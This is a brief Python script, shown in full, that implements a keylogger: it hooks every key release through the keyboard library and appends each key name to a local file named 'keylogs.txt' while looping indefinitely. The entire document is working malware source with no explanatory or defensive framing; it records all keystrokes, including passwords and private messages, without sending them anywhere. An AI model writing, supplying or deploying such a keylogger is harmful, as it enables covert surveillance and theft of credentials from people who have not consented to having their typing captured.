import keyboard
import time

log_file = "keylogs.txt"

def write_to_file(key):
    with open(log_file, "a") as file:
        file.write(key.name + "\n")

keyboard.on_release(callback=write_to_file)

while True:
    time.sleep(10)
